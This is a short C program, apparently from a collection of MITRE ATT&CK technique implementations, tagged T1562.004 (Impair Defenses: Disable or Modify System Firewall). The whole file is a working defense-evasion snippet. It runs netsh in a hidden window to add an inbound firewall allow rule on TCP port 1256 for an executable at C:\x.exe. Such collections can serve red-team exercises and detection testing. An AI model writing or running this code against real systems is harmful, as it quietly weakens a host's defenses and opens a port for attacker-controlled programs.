// Link      = https://attack.mitre.org/techniques/T1562/004/
// Technique = Impair Defenses: Disable or Modify System Firewall
// ID        = T1562.004
// Tactics   = Defense Evasion,

#include <windows.h>

int main() {
    STARTUPINFOA si;
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, (LPSTR)"netsh advfirewall firewall add rule name=\"some_rule\" dir=in action=allow protocol=TCP localport=1256 program=\"C:\\x.exe\" description=\"xxx\" enable=yes", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

